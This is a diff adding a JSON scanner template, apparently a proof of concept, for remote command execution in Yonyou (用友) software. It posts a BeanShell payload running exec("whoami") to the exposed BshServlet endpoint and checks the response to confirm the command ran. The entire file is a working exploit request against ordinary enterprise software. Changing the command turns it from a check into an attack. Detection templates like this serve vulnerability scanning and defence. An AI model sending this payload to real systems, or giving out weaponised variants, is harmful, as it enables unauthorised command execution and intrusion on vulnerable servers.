@@ -1,0 +1,38 @@
+{
+    "Name": "用友远程命令执行",
+    "Description": "用友远程命令执行",
+    "Product": "用友",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/servlet/~ic/bsh.servlet.BshServlet",
+        "Port":"",
+        "Data":"bsh.script=exec%28%22whoami%22%29%3B%0D%0A",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "exec(\"whoami\")"
+                },
+                {
+                 "Operation": "contains", 
+                 "Key":"",
+                 "Value": "Script Return Value"
+                 },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
+
